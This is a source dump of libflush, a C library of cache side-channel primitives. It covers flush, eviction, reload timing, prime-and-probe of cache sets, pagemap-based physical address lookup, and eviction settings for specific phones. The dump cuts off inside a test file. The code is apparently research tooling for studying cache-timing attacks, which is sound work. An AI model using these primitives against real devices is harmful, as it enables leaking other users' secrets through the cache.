```h
/* See LICENSE file for license and copyright information */

/* OnePlus One */
#define NUMBER_OF_SETS 4096
#define LINE_LENGTH_LOG2 6
#define LINE_LENGTH 64
#define ES_EVICTION_COUNTER 10
#define ES_NUMBER_OF_ACCESSES_IN_LOOP 2
#define ES_DIFFERENT_ADDRESSES_IN_LOOP 2

```

`libflush/libflush/eviction/strategies/zeroflte.h`:

```h
/* See LICENSE file for license and copyright information */

/* Samsung S6 (A53) */
#if 1
#define NUMBER_OF_SETS 512
#define LINE_LENGTH_LOG2 6
#define LINE_LENGTH 64
#define ES_EVICTION_COUNTER 21
#define ES_NUMBER_OF_ACCESSES_IN_LOOP 2
#define ES_DIFFERENT_ADDRESSES_IN_LOOP 5
#else
/* Samsung S6 (A57) */
#define NUMBER_OF_SETS 2048
#define LINE_LENGTH_LOG2 6
#define LINE_LENGTH 64
#define ES_EVICTION_COUNTER 25
#define ES_NUMBER_OF_ACCESSES_IN_LOOP 10
#define ES_DIFFERENT_ADDRESSES_IN_LOOP 10
#endif

```

`libflush/libflush/internal.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef INTERNAL_H
#define INTERNAL_H

#include "libflush.h"

#if TIME_SOURCE == TIME_SOURCE_THREAD_COUNTER
#include <pthread.h>

typedef struct thread_data_s {
  libflush_session_t* session;
  ssize_t cpu;
} thread_data_t;
#endif

struct libflush_session_s {
  void* data;
  bool performance_register_div64;

#if HAVE_PAGEMAP_ACCESS == 1
  struct {
    int pagemap;
  } memory;
#endif

#if TIME_SOURCE == TIME_SOURCE_THREAD_COUNTER
  struct {
    pthread_t thread;
    volatile uint64_t value;
    thread_data_t data;
  } thread_counter;
#endif

#if TIME_SOURCE == TIME_SOURCE_PERF
  struct {
    int fd;
  } perf;
#endif
};

#endif  /*INTERNAL_H*/

```

`libflush/libflush/libflush.c`:

```c
/* See LICENSE file for license and copyright information */

#define _GNU_SOURCE
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <unistd.h>
#include <inttypes.h>
#include <getopt.h>
#include <sched.h>
#include <assert.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "libflush.h"
#include "timing.h"
#include "internal.h"
#include "eviction/eviction.h"

#include <pthread.h>

#if defined(__ARM_ARCH_7A__)
#include "armv7/libflush.h"
#elif defined(__ARM_ARCH_8A__)
#include "armv8/libflush.h"
#elif defined(__i386__) || defined(__x86_64__)
#include "x86/libflush.h"
#endif

static uint64_t libflush_get_timing_start(libflush_session_t* session);
static uint64_t libflush_get_timing_end(libflush_session_t* session);

#if HAVE_PAGEMAP_ACCESS == 1
static size_t get_frame_number_from_pagemap(size_t value);
#endif

bool
libflush_init(libflush_session_t** session, libflush_session_args_t* args)
{
  (void) session;
  (void) args;

  if (session == NULL) {
    return false;
  }

  if ((*session = calloc(1, sizeof(libflush_session_t))) == NULL) {
    return false;
  }

  if (args != NULL) {
    (*session)->performance_register_div64 = args->performance_register_div64;
  }

#if HAVE_PAGEMAP_ACCESS == 1
  (*session)->memory.pagemap = open("/proc/self/pagemap", O_RDONLY);
  if ((*session)->memory.pagemap == -1) {
    free(*session);
    return false;
  }
#endif

  /* Initialize timer */
#if TIME_SOURCE == TIME_SOURCE_PERF
  perf_init(*session, args);
#elif TIME_SOURCE == TIME_SOURCE_THREAD_COUNTER
  thread_counter_init(*session, args);
#endif

  /* Initialize eviction */
  libflush_eviction_init(*session, args);

  /* Initialize architecture */
#if defined(__ARM_ARCH_7A__)
  arm_v7_init(*session, args);
#elif defined(__ARM_ARCH_8A__)
  arm_v8_init(*session, args);
#endif

  return true;
}

bool
libflush_terminate(libflush_session_t* session)
{
  (void) session;

  if (session == NULL) {
    return false;
  }

  /* Pagemap access */
#if HAVE_PAGEMAP_ACCESS == 1
  if (session->memory.pagemap >= 0) {
    close(session->memory.pagemap);
  }
  session->memory.pagemap = -1;
#endif

  /* Terminate timer */
#if TIME_SOURCE == TIME_SOURCE_PERF
  perf_terminate(session);
#elif TIME_SOURCE == TIME_SOURCE_THREAD_COUNTER
  thread_counter_terminate(session);
#endif

  /* Terminate eviction */
  libflush_eviction_terminate(session);

  /* Terminate architecture */
#if defined(__ARM_ARCH_7A__)
  arm_v7_terminate(session);
#elif defined(__ARM_ARCH_8A__)
  arm_v8_terminate(session);
#endif

  /* Clean-up */
  free(session);

  return true;
}

void
libflush_flush(libflush_session_t* session, void* address)
{
  (void) session;

#if USE_EVICTION == 1
  libflush_eviction_evict(session, address);
#elif defined(__ARM_ARCH_8A__)
  arm_v8_flush(address);
#elif defined(__i386__) || defined(__x86_64__)
  x86_flush(address);
#else
#error No flush/eviction method available on this platform
#endif
}

uint64_t
libflush_flush_time(libflush_session_t* session, void* address)
{
  (void) session;

  uint64_t start = libflush_get_timing(session);

#if USE_EVICTION == 1
  libflush_eviction_evict(session, address);
#elif defined(__ARM_ARCH_8A__)
  arm_v8_flush(address);
#elif defined(__i386__) || defined(__x86_64__)
  x86_flush(address);
#else
#error No flush/eviction method available on this platform
#endif

  return libflush_get_timing(session) - start;
}

void
libflush_evict(libflush_session_t* session, void* address)
{
  libflush_eviction_evict(session, address);
}

uint64_t
libflush_evict_time(libflush_session_t* session, void* address)
{
  uint64_t start = libflush_get_timing(session);
  libflush_eviction_evict(session, address);
  return libflush_get_timing(session) - start;
}

void
libflush_prefetch(libflush_session_t* session, void* address)
{
  (void) session;

#if defined(__ARM_ARCH_7A__)
  arm_v7_prefetch(address);
  libflush_memory_barrier();
#elif defined(__ARM_ARCH_8A__)
  arm_v8_prefetch(address);
  libflush_memory_barrier();
#elif defined(__i386__) || defined(__x86_64__)
  x86_prefetch(address);
#else
#error No prefetch method available on this platform
#endif
}

uint64_t
libflush_prefetch_time(libflush_session_t* session, void* address)
{
  (void) session;

  uint64_t start = libflush_get_timing_start(session);

#if defined(__ARM_ARCH_7A__)
  arm_v7_prefetch(address);
  libflush_memory_barrier();
#elif defined(__ARM_ARCH_8A__)
  arm_v8_prefetch(address);
  libflush_memory_barrier();
#elif defined(__i386__) || defined(__x86_64__)
  x86_prefetch(address);
#else
#error No prefetch method available on this platform
#endif

  return libflush_get_timing_end(session) - start;
}

uint64_t
libflush_get_timing(libflush_session_t* session)
{
  (void) session;

  uint64_t result = 0;

  libflush_memory_barrier();

#if TIME_SOURCE == TIME_SOURCE_MONOTONIC_CLOCK
  result = get_monotonic_time();
#elif TIME_SOURCE == TIME_SOURCE_PERF
  result = perf_get_timing(session);
#elif TIME_SOURCE == TIME_SOURCE_THREAD_COUNTER
  result = thread_counter_get_timing(session);
#elif TIME_SOURCE == TIME_SOURCE_REGISTER
#if defined(__ARM_ARCH_7A__)
  result = arm_v7_get_timing();
#elif defined(__ARM_ARCH_8A__)
  result = arm_v8_get_timing();
#elif defined(__i386__) || defined(__x86_64__)
  result = x86_get_timing();
#endif
#endif

  libflush_memory_barrier();

  return result;
}

static uint64_t
libflush_get_timing_start(libflush_session_t* session)
{
  (void) session;

  uint64_t result = 0;

#if defined(__i386__) || defined(__x86_64__)
  result = x86_get_timing_start();
#else
  result = libflush_get_timing(session);
#endif

  return result;
}

static uint64_t
libflush_get_timing_end(libflush_session_t* session)
{
  (void) session;

  uint64_t result = 0;

#if defined(__i386__) || defined(__x86_64__)
  result = x86_get_timing_end();
#else
  result = libflush_get_timing(session);
#endif

  return result;
}

void
libflush_reset_timing(libflush_session_t* session)
{
  (void) session;

#if TIME_SOURCE == TIME_SOURCE_PERF
  perf_reset_timing(session);
#elif TIME_SOURCE == TIME_SOURCE_REGISTER
#if defined(__ARM_ARCH_7A__)
  arm_v7_reset_timing(session->performance_register_div64);
#elif defined(__ARM_ARCH_8A__)
  arm_v8_reset_timing();
#endif
#endif

  libflush_memory_barrier();
}

inline void
libflush_access_memory(void *address) {
#if defined(__ARM_ARCH_7A__)
  arm_v7_access_memory(address);
#elif defined(__ARM_ARCH_8A__)
  arm_v8_access_memory(address);
#elif defined(__i386__) || defined(__x86_64__)
  x86_access_memory(address);
#endif
}

uint64_t
libflush_reload_address(libflush_session_t* session, void* address)
{
  uint64_t time = libflush_get_timing(session);
  libflush_access_memory(address);

  return libflush_get_timing(session) - time;
}

uint64_t
libflush_reload_address_and_flush(libflush_session_t* session, void* address)
{
  uint64_t time = libflush_get_timing_start(session);
  libflush_access_memory(address);
  uint64_t delta =  libflush_get_timing_end(session) - time;
  libflush_flush(session, address);

  return delta;
}

uint64_t
libflush_reload_address_and_evict(libflush_session_t* session, void* address)
{
  uint64_t time = libflush_get_timing_start(session);
  libflush_access_memory(address);
  uint64_t delta =  libflush_get_timing_end(session) - time;
  libflush_evict(session, address);

  return delta;
}

inline void
libflush_memory_barrier()
{
#if defined(__ARM_ARCH_7A__)
  arm_v7_memory_barrier();
#elif defined(__ARM_ARCH_8A__)
  arm_v8_memory_barrier();
#elif defined(__i386__) || defined(__x86_64__)
  x86_memory_barrier();
#endif
}

void
libflush_prime(libflush_session_t* session, size_t set_index)
{
  libflush_eviction_prime(session, set_index);
}

size_t
libflush_get_set_index(libflush_session_t* session, void* address)
{
  return libflush_eviction_get_set_index(session, address);
}

size_t
libflush_get_number_of_sets(libflush_session_t* session)
{
  return libflush_eviction_get_number_of_sets(session);
}

uint64_t
libflush_probe(libflush_session_t* session, size_t set_index)
{
  uint64_t time = libflush_get_timing_start(session);
  libflush_eviction_probe(session, set_index);
  uint64_t delta =  libflush_get_timing_end(session) - time;

  return delta;
}

uintptr_t
libflush_get_physical_address(libflush_session_t* session, uintptr_t virtual_address)
{
  (void) session;
  (void) virtual_address;

#if HAVE_PAGEMAP_ACCESS == 1
  // Access memory
  libflush_access_memory((void *) virtual_address);

  uint64_t value;
  off_t offset = (virtual_address / 4096) * sizeof(value);
  int got = pread(session->memory.pagemap, &value, sizeof(value), offset);
  assert(got == 8);

  // Check the "page present" flag.
  assert(value & (1ULL << 63));

  uint64_t frame_num = get_frame_number_from_pagemap(value);
  return (frame_num * 4096) | (virtual_address & (4095));
#else
  return 0;
#endif
}

uint64_t
libflush_get_pagemap_entry(libflush_session_t* session, uint64_t virtual_address)
{
  (void) session;
  (void) virtual_address;

#if HAVE_PAGEMAP_ACCESS == 1
  // Access memory
  uint64_t value;
  off_t offset = (virtual_address / 4096) * sizeof(value);
  int got = pread(session->memory.pagemap, &value, sizeof(value), offset);
  assert(got == 8);

  return value;
#else
  return 0;
#endif
}

#if HAVE_PAGEMAP_ACCESS == 1
static size_t
get_frame_number_from_pagemap(size_t value)
{
  return value & ((1ULL << 55) - 1);
}
#endif

```

`libflush/libflush/libflush.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef LIBFLUSH_H
#define LIBFLUSH_H

#ifdef __cplusplus
extern "C" {
#endif

#include <stdint.h>
#include <stdlib.h>
#include <stdbool.h>

/**
 * libflush session
 */
typedef struct libflush_session_args_s {
  size_t bind_to_cpu; /**< CPU id to bind dedicated thread timer */
  bool performance_register_div64; /**< Enable 64 divisor (ARM only) */
} libflush_session_args_t;

typedef struct libflush_session_s libflush_session_t;

/**
 * Initializes the libflush session
 *
 * @param[out] session The initialized session
 * @param[in] args Additional arguments for the initialization
 *
 * @return true Initialization was successful
 * @return false Initialization failed
 */
bool libflush_init(libflush_session_t** session, libflush_session_args_t* args);

/**
 * Terminates the libflush session
 *
 * @param[in] session The initialized session
 *
 * @return true Termination was successful
 * @return false Termination failed
 */
bool libflush_terminate(libflush_session_t* session);

/**
 * Get current time measurement
 *
 * @param[in] session The used session
 *
 * @return Current time measurements
 */
uint64_t libflush_get_timing(libflush_session_t* session);

/**
 * Resets the time measurement
 *
 * @param[in] session The used session
 */
void libflush_reset_timing(libflush_session_t* session);

/**
 * Flushes the given address
 *
 * @param[in] session The used session
 * @param[in] address The address to flush
 */
void libflush_flush(libflush_session_t* session, void* address);

/**
 * Measure how long it takes to flush the given address
 *
 * @param[in] session The used session
 * @param[in] address The address to flush
 *
 * @return Timing measurement
 */
uint64_t libflush_flush_time(libflush_session_t* session, void* address);

/**
 * Evicts the given address
 *
 * @param[in] session The used session
 * @param[in] address The address to flush
 */
void libflush_evict(libflush_session_t* session, void* address);

/**
 * Measure how long it takes to evict the given address
 *
 * @param[in] session The used session
 * @param[in] address The address to flush
 *
 * @return Timing measurement
 */
uint64_t libflush_evict_time(libflush_session_t* session, void* address);

/**
 * Accesses the given data pointer
 *
 * @param[in] address Address to access
 */
void libflush_access_memory(void *address);

/**
 * Measures the time it takes to access the given address
 *
 * @param[in] session The used session
 * @param[in] address Address to access
 *
 * @return Timing measurement
 */
uint64_t libflush_reload_address(libflush_session_t* session, void* address);

/**
 * Measures the time it takes to access the given address. Then the address is
 * flushed to memory.
 *
 * @param[in] session The used session
 * @param[in] address Address to access
 *
 * @return Timing measurement
 */
uint64_t libflush_reload_address_and_flush(libflush_session_t* session, void* address);

/**
 * Measures the time it takes to access the given address. Then the address is
 * evicted to memory.
 *
 * @param[in] session The used session
 * @param[in] address Address to access
 *
 * @return Timing measurement
 */
uint64_t libflush_reload_address_and_evict(libflush_session_t* session, void* address);

/**
 * Memory barrier
 */
void libflush_memory_barrier();

/**
 * Primes a given cache set.
 *
 * @param[in] session The used session
 * @param[in] set_index The set index
 */
void libflush_prime(libflush_session_t* session, size_t set_index);

/**
 * Probes a given cache set.
 *
 * @param[in] session The used session
 * @param[in] set_index The set index
 *
 * @return Timing measurement
 */
uint64_t libflush_probe(libflush_session_t* session, size_t set_index);

/**
 * Returns the set index of a given address
 *
 * @param[in] session The used session
 * @param[in] address The target address
 *
 * @return The set index
 */
size_t libflush_get_set_index(libflush_session_t* session, void* address);

/**
 * Returns the number of sets
 *
 * @param[in] session The used session
 *
 * @return The number of sets
 */
size_t libflush_get_number_of_sets(libflush_session_t* session);

/**
 * Prefetches an address.
 *
 * @param[in] session The used session.
 * @param[in] address The target address.
 */
void libflush_prefetch(libflush_session_t* session, void* address);

/**
 * Measures the time it takes to prefetch a given address.
 *
 * @param[in] session The used session.
 * @param[in] address The target address.
 *
 * @return Timing measurement
 */
uint64_t libflush_prefetch_time(libflush_session_t* session, void* address);

/**
 * Returns the physical address of an virtual address.
 *
 * @param[in] session The used session
 * @param[in] virtual_address The virtual address
 *
 * @return The physical address
 */
uintptr_t libflush_get_physical_address(libflush_session_t* session, uintptr_t virtual_address);

/**
 * Returns the raw pagemap entry of an virtual address.
 *
 * @param[in] session The used session
 * @param[in] virtual_address The virtual address
 *
 * @return The raw pagemap entry
 */
uint64_t libflush_get_pagemap_entry(libflush_session_t* session, uint64_t virtual_address);

/**
 * Binds the process to a cpu
 *
 * @param[in] cpu The cpu id
 *
 * @return true Binding to the cpu was successful
 * @return false Binding to the cpu failed
 */
bool libflush_bind_to_cpu(size_t cpu);

#ifdef __cplusplus
}
#endif

#endif /* LIBFLUSH_H */

```

`libflush/libflush/timing.c`:

```c
/* See LICENSE file for license and copyright information */

#define _GNU_SOURCE
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <unistd.h>
#include <inttypes.h>
#include <sys/ioctl.h>
#include <getopt.h>
#include <sched.h>

#include "libflush.h"
#include "timing.h"
#include "internal.h"

#if TIME_SOURCE == TIME_SOURCE_MONOTONIC_CLOCK
#include <time.h>

uint64_t
get_monotonic_time(void)
{
  struct timespec t1;
  clock_gettime(CLOCK_MONOTONIC, &t1);
  return t1.tv_sec * 1000*1000*1000ULL + t1.tv_nsec;
}
#endif

#if TIME_SOURCE == TIME_SOURCE_PERF
#include <assert.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>

inline bool
perf_init(libflush_session_t* session, libflush_session_args_t* args)
{
  (void) session;
  (void) args;

  static struct perf_event_attr attr;
  attr.type = PERF_TYPE_HARDWARE;
  attr.config = PERF_COUNT_HW_CPU_CYCLES;
  attr.size = sizeof(attr);
  attr.exclude_kernel = 1;
  attr.exclude_hv = 1;
  attr.exclude_callchain_kernel = 1;

  session->perf.fd = syscall(__NR_perf_event_open, &attr, 0, -1, -1, 0);
  assert(session->perf.fd >= 0 && "if this assertion fails you have no perf event interface available for the userspace. install a different kernel/rom."); // if this assertion fails you have no perf event interface available for the userspace. install a different kernel/rom.

  return true;
}

inline bool
perf_terminate(libflush_session_t* session)
{
  close(session->perf.fd);

  return true;
}

inline uint64_t
perf_get_timing(libflush_session_t* session)
{
  long long result = 0;

  if (read(session->perf.fd, &result, sizeof(result)) < (ssize_t) sizeof(result)) {
    return 0;
  }

  return result;
}

inline void
perf_reset_timing(libflush_session_t* session)
{
  ioctl(session->perf.fd, PERF_EVENT_IOC_RESET, 0);
}
#endif

#if TIME_SOURCE == TIME_SOURCE_THREAD_COUNTER
static void* thread_counter_func(void*);
#include <pthread.h>

inline bool
thread_counter_init(libflush_session_t* session, libflush_session_args_t* args)
{
  if (session == NULL) {
    return false;
  }

  session->thread_counter.data.cpu = (args != NULL) ? (ssize_t) args->bind_to_cpu : -1;
  session->thread_counter.data.session = session;

  if (pthread_create(&(session->thread_counter.thread), NULL,
        thread_counter_func, &(session->thread_counter.data)) != 0) {
    return false;
  }

  return true;
}

inline bool
thread_counter_terminate(libflush_session_t* session)
{
  if (session == NULL) {
    return false;
  }

#if __BIONIC__
  pthread_kill(session->thread_counter.thread, SIGUSR1);
#else
  pthread_cancel(session->thread_counter.thread);
#endif
  pthread_join(session->thread_counter.thread, NULL);

  return true;
}

inline uint64_t
thread_counter_get_timing(libflush_session_t* session)
{
  libflush_memory_barrier(session);

  uint64_t time = session->thread_counter.value;

  libflush_memory_barrier(session);

  return time;
}

#if __BIONIC__
static void
thread_exit_handler(int sig)
{
  (void) sig;

  pthread_exit(NULL);
}
#endif

static void*
thread_counter_func(void* data) {
#ifndef __BIONIC__
  /* Set cancel able */
  pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);
#endif

  /* Unpack data */
  thread_data_t* thread_data = (thread_data_t*) data;
  libflush_session_t* session = thread_data->session;
  ssize_t cpu = thread_data->cpu;

  /* Bind to CPU */
  if (cpu > 0) {
    if (libflush_bind_to_cpu(cpu) == false) {
      fprintf(stderr, "Could not bind to CPU: %zu\n", cpu);
    } else {
      fprintf(stderr, "Bind thread to CPU: %zu\n", cpu);
    }
  }

#if __BIONIC__
  /* Setup cancel signal */
  struct sigaction action;
  memset(&action, 0, sizeof(struct sigaction));
  memset(&action.sa_mask, 0, sizeof(sigset_t));
  action.sa_flags = 0;
#if defined(__ARM_ARCH_7A__)
  action._u._sa_handler = thread_exit_handler;
#else
  action.sa_handler = thread_exit_handler;
#endif
  sigaction(SIGUSR1, &action, NULL);
#endif

  while (true) {
    session->thread_counter.value++;
  }

  pthread_exit(NULL);
}
#endif

```

`libflush/libflush/timing.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef TIMING_H
#define TIMING_H

#include <stdint.h>

#include "libflush.h"

#define TIME_SOURCE_REGISTER 1
#define TIME_SOURCE_PERF 2
#define TIME_SOURCE_MONOTONIC_CLOCK 3
#define TIME_SOURCE_THREAD_COUNTER  4

#if TIME_SOURCE == TIME_SOURCE_MONOTONIC_CLOCK
uint64_t get_monotonic_time(void);
#endif

#if TIME_SOURCE == TIME_SOURCE_PERF
bool perf_init(libflush_session_t* session, libflush_session_args_t* args);
bool perf_terminate(libflush_session_t* session);
uint64_t perf_get_timing(libflush_session_t* session);
uint64_t perf_get_timing_start(libflush_session_t* session);
uint64_t perf_get_timing_end(libflush_session_t* session);
void perf_reset_timing(libflush_session_t* session);
#endif

#if TIME_SOURCE == TIME_SOURCE_THREAD_COUNTER
bool thread_counter_init(libflush_session_t* session, libflush_session_args_t* args);
uint64_t thread_counter_get_timing(libflush_session_t* session);
bool thread_counter_terminate(libflush_session_t* session);
#endif

#endif // TIMING_H

```

`libflush/libflush/utils.c`:

```c
/* See LICENSE file for license and copyright information */

#if ANDROID_PLATFORM >= 21
#define _GNU_SOURCE
#include <sched.h>
#endif

#include "libflush.h"

#if ANDROID_PLATFORM < 21
#include <sys/syscall.h>
#include <string.h>

#define CPU_SETSIZE 1024
#define __NCPUBITS  (8 * sizeof (unsigned long))

typedef struct cpu_set_s {
  unsigned long __bits[CPU_SETSIZE / __NCPUBITS];
} cpu_set_t;

#define CPU_SET(cpu, cpusetp) \
    ((cpusetp)->__bits[(cpu)/__NCPUBITS] |= (1UL << ((cpu) % __NCPUBITS)))

#define CPU_ZERO(cpusetp) \
    memset((cpusetp), 0, sizeof(cpu_set_t))
#else
#endif

bool
libflush_bind_to_cpu(size_t cpu)
{
  cpu_set_t mask;
  CPU_ZERO(&mask);
  CPU_SET(cpu, &mask);

#if ANDROID_PLATFORM < 21
  if (syscall(__NR_sched_setaffinity, 0, sizeof(mask), &mask) == -1) {
#else
  if (sched_setaffinity(0, sizeof(mask), &mask) == -1) {
#endif
    return false;
  } else {
    return true;
  }
}

```

`libflush/libflush/version.h.in`:

```in
/* See LICENSE file for license and copyright information */

#ifndef LIBFLUSH_VERSION_H
#define LIBFLUSH_VERSION_H

#define LIBFLUSH_VERSION_MAJOR ZVMAJOR
#define LIBFLUSH_VERSION_MINOR ZVMINOR
#define LIBFLUSH_VERSION_REV ZVREV
#define LIBFLUSH_VERSION "ZVMAJOR.ZVMINOR.ZVREV"
#define LIBFLUSH_API_VERSION ZVAPI
#define LIBFLUSH_ABI_VERSION ZVABI

#endif

```

`libflush/libflush/x86/flush.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef X86_FLUSH_H
#define X86_FLUSH_H

extern inline void x86_flush(void* address)
{
  asm volatile ("clflush 0(%0)"
    :
    : "r" (address)
    : "rax"
  );
}

#endif /* X86_FLUSH_H */

```

`libflush/libflush/x86/libflush.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef X86_LIBFLUSH_H
#define X86_LIBFLUSH_H

#include "flush.h"
#include "timing.h"
#include "memory.h"

#endif /* X86_LIBFLUSH_H */

```

`libflush/libflush/x86/memory.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef X86_MEMORY_H
#define X86_MEMORY_H

extern inline void
x86_access_memory(void* pointer)
{
  asm volatile ("movq (%0), %%rax\n"
      :
      : "c" (pointer)
      : "rax");
}

extern inline void
x86_memory_barrier(void)
{
  asm volatile ("mfence");
}

extern inline void
x86_prefetch(void* pointer)
{
  asm volatile ("prefetchnta (%0)" :: "r" (pointer));
  asm volatile ("prefetcht2 (%0)" :: "r" (pointer));
}

#endif  /*X86_MEMORY_H*/

```

`libflush/libflush/x86/timing.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef X86_TIMING_H
#define X86_TIMING_H

#include <stdint.h>

#include "memory.h"

extern inline uint64_t
x86_get_timing(void)
{
  uint64_t result = 0;
  uint64_t d = 0;

  asm volatile ("rdtsc" : "=a" (result), "=d" (d));
  result = (d << 32) | result;

  return result;
}

extern inline uint64_t
x86_get_timing_start(void)
{
  uint64_t result = 0;
  uint64_t d = 0;

    asm volatile ("mfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "xor %%rax, %%rax\n\t"
    "CPUID\n\t"
    : "=r" (d), "=r" (result)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");

  result = (d << 32) | result;

  return result;
}

extern inline  uint64_t
x86_get_timing_end(void)
{
  uint64_t result = 0;
  uint64_t d = 0;

  asm volatile(
    "xor %%rax, %%rax\n\t"
    "CPUID\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "mfence\n\t"
  : "=r" (d), "=r" (result)
  :
  : "%rax", "%rbx", "%rcx", "%rdx");

  result = (d << 32) | result;

  return result;
}

#endif  /*X86_TIMING_H*/

```

`libflush/tests/Makefile`:

```
# See LICENSE file for license and copyright information

include ../config.mk
include ../colors.mk
include ../common.mk

include config.mk

PROJECT       = tests
SOURCE        = $(wildcard *.c)
OBJECTS       = $(addprefix ${BUILDDIR_RELEASE}/,${SOURCE:.c=.o})
OBJECTS_DEBUG = $(addprefix ${BUILDDIR_DEBUG}/,${SOURCE:.c=.o})
OBJECTS_GCOV  = $(addprefix ${BUILDDIR_GCOV}/,${SOURCE:.c=.o})

ifneq (${WITH_LIBFIU},0)
INCS += ${FIU_INC}
LIBS += ${FIU_LIB}
FIU_EXEC += ${FIU_RUN}
CPPFLAGS += -DFIU_ENABLE
endif

ifeq "${ARCH}" "armv7"
	include ../config-arm.mk
endif

ifneq (${HAVE_PAGEMAP_ACCESS},0)
CPPFLAGS += -DHAVE_PAGEMAP_ACCESS=${HAVE_PAGEMAP_ACCESS}
endif

ifneq ($(wildcard ${VALGRIND_SUPPRESSION_FILE}),)
VALGRIND_ARGUMENTS += --suppressions=${VALGRIND_SUPPRESSION_FILE}
endif

all: options ${PROJECT}

options:
ifeq "$(VERBOSE)" "1"
	$(ECHO) ${PROJECT} build options:
	$(ECHO) "CFLAGS  = ${CFLAGS}"
	$(ECHO) "LDFLAGS = ${LDFLAGS}"
	$(ECHO) "DFLAGS  = ${DFLAGS}"
	$(ECHO) "CC      = ${CC}"
endif

# release

${PROJECT}: options ${OBJECTS}
	$(QUIET)${MAKE} WITH_LIBFIU=${WITH_LIBFIU} -C .. libflush
	$(call colorecho,CC,$@)
	$(QUIET)${CC} ${SFLAGS} ${LDFLAGS} -o $@ \
		${OBJECTS} ${LIBFLUSH_RELEASE} ${LIBS}

${OBJECTS}: config.mk ../config.mk ../libflush/version.h

${BUILDDIR_RELEASE}/%.o: %.c
	$(call colorecho,CC,$<)
	@mkdir -p ${DEPENDDIR}/$(dir $(abspath $@))
	@mkdir -p $(dir $(abspath $@))
	$(QUIET)${CC} -c ${CPPFLAGS} ${CFLAGS} \
		-o $@ $< -MMD -MF ${DEPENDDIR}/$(abspath $@).dep

run: ${PROJECT}
	$(QUIET)${FIU_EXEC} ./${PROJECT}

# debug

debug: options ${PROJECT}-debug

${PROJECT}-debug: ${OBJECTS_DEBUG}
	$(QUIET)${MAKE} WITH_LIBFIU=${WITH_LIBFIU} -C .. libflush-debug
	$(call colorecho,CC,$@)
	$(QUIET)${CC} ${LDFLAGS} -o $@ \
		${OBJECTS_DEBUG} ${LIBFLUSH_DEBUG} ${LIBS}

${OBJECTS_DEBUG}: config.mk ../config.mk ../libflush/version.h

${BUILDDIR_DEBUG}/%.o: %.c
	@mkdir -p ${DEPENDDIR}/$(dir $(abspath $@))
	@mkdir -p $(dir $(abspath $@))
	$(call colorecho,CC,$<)
	$(QUIET)${CC} -c ${CPPFLAGS} ${CFLAGS} ${DFLAGS} \
		-o $@ $< -MMD -MF ${DEPENDDIR}/$(abspath $@).dep

run-debug: ${PROJECT}-debug
	$(QUIET)${FIU_EXEC} ./${PROJECT}-debug

# gcov

gcov: options ${PROJECT}-gcov

${PROJECT}-gcov: options ${OBJECTS_GCOV}
	$(QUIET)${MAKE} WITH_LIBFIU=${WITH_LIBFIU} -C .. libflush-gcov
	$(call colorecho,CC,$@)
	$(QUIET)${CC} ${LDFLAGS} ${GCOV_LDFLAGS} -o $@ \
		${OBJECTS_GCOV} ${LIBFLUSH_GCOV} ${LIBS}

${OBJECTS_GCOV}: config.mk ../config.mk ../libflush/version.h

${BUILDDIR_GCOV}/%.o: %.c
	@mkdir -p ${DEPENDDIR}/$(dir $(abspath $@))
	@mkdir -p $(dir $(abspath $@))
	$(call colorecho,CC,$<)
	$(QUIET)${CC} -c ${CPPFLAGS} ${CFLAGS} ${GCOV_CFLAGS} ${DFLAGS} ${GCOV_DFLAGS} \
		-o $@ $< -MMD -MF ${DEPENDDIR}/$(abspath $@).dep

run-gcov: ${PROJECT}-gcov
	$(QUIET)${FIU_EXEC} ./${PROJECT}-gcov

../libflush/version.h:
	$(MAKE) -C .. libflush/version.h

valgrind: ${PROJECT}-debug
	 $(QUIET)G_SLICE=always-malloc G_DEBUG=gc-friendly ${FIU_EXEC} ${VALGRIND} ${VALGRIND_ARGUMENTS} ./${PROJECT}-debug

clean:
	$(call colorecho,RM, "Clean test files")
	$(QUIET)rm -rf ${PROJECT}
	$(QUIET)rm -rf ${PROJECT}-debug
	$(QUIET)rm -rf ${PROJECT}-gcov
	$(QUIET)rm -rf ${BUILDDIR}
	$(QUIET)rm -rf ${DEPENDDIR}

.PHONY: all options clean debug run

-include $(wildcard ${DEPENDDIR}/*.dep)

```

`libflush/tests/config.mk`:

```mk
# See LICENSE file for license and copyright information

CHECK_INC ?= $(shell pkg-config --cflags check)
CHECK_LIB ?= $(shell pkg-config --libs check)

INCS += ${CHECK_INC} ${FIU_INC} -I ../libflush
LIBS += ${CHECK_LIB} ${FIU_LIB} -lpthread -Wl,--whole-archive -Wl,--no-whole-archive
LDFLAGS += -rdynamic

LIBFLUSH_RELEASE=../${BUILDDIR_RELEASE}/libflush.a
LIBFLUSH_DEBUG=../${BUILDDIR_DEBUG}/libflush.a
LIBFLUSH_GCOV=../${BUILDDIR_GCOV}/libflush.a
#
# valgrind
VALGRIND = valgrind
VALGRIND_ARGUMENTS = --tool=memcheck --leak-check=yes --leak-resolution=high \
	--show-reachable=yes --log-file=libflush-valgrind.log
VALGRIND_SUPPRESSION_FILE = libflush.suppression

```

`libflush/tests/eviction.c`:

```c
/* See LICENSE file for license and copyright information */

#include <check.h>

#include <libflush.h>
#include <eviction/eviction.h>
#include <eviction/configuration.h>

libflush_session_t* libflush_session;

static void setup_session(void) {
  fail_unless(libflush_init(&libflush_session, NULL) == true);
  fail_unless(libflush_session != NULL);
}

static void teardown_session(void) {
  fail_unless(libflush_terminate(libflush_session) == true);
  libflush_session = NULL;
}

START_TEST(test_eviction_init) {
  /* Invalid arguments */
  fail_unless(libflush_eviction_init(NULL, NULL) == false);
} END_TEST

START_TEST(test_eviction_terminate) {
  /* Invalid arguments */
